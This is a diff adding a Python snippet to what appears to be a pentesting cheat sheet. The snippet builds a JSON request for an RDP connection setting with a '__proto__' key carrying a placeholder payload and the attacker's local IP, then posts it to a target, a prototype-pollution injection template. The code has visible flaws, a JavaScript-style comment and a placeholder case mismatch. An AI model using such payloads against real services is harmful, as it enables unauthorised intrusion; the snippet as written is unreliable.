@@ -331,6 +331,38 @@ print("Body:\n", prepared_request.body)
 
 ### <a name='Reusablecode'></a>Reusable code
 
+#### <a name='WorkingWithJSON'></a>Working with JSON snippets
+```python
+
+jsonPayload = {
+    'connection': {
+        'type': 'rdp',
+        'settings': {
+            'hostname': 'example',
+            'username': 'kali',
+            'password': 'kali',
+            'port': '3389',
+            "__proto__":
+                {
+                    "someFunction":   "payload with <localIP>"
+                }
+        },
+    },
+}
+
+//convert payload from JSON to string 
+jsonDataString = json.dumps(jsonPayload)
+   
+jsonDataString = jsonDataString.replace("<localip>", localip)
+jsonData = json.loads(jsonDataString)
+response = requests.post(url, json=jsonData, proxies=proxies)
+
+jsonResponse = response.json()
+fieldValue = jsonResponse["fieldKey"]
+
+```
+
+
 #### <a name='ServingfilesviaHTTP'></a>Serving files via HTTP
 
 ```python
